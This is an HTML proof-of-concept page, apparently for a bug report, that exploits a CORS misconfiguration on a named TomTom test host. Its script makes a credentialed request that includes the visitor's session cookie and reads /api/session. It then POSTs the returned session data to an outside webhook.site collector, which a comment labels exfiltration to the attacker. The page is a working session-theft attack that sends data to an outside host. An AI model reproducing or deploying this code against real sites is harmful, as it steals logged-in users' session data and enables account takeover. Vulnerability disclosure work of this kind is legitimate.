<!doctype html>
<html>

<head>
    <meta charset="utf-8">
    <title>CORS mis-use PoC – DeLorean Drive test</title>
</head>

<body>
    <h2>CORS PoC for delorean-drive-test.tomtomgroup.com</h2>
    <p>If you are logged in, your session data will appear below in ~1 s.</p>
    <pre id="loot"></pre>

    <script>
        // 1. Credentialed request to the leaky endpoint
        fetch('https://delorean-drive-test.tomtomgroup.com/api/session', {
            method: 'GET',
            credentials: 'include'   // sends JSESSIONID cookie
        })
            .then(r => r.json())
            .then(data => {
                // 2. Show it in the page (so you see it worked)
                document.getElementById('loot').textContent = JSON.stringify(data, null, 2);

                // 3. Exfiltrate to attacker (change the URL to your collector)
                return fetch('https://webhook.site/445b3885-da06-4d12-b4c2-477cc5d38aa6', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: { 'Content-Type': 'application/json' }
                });
            })
            .catch(err => console.error('Failed:', err));
    </script>
</body>

</html>
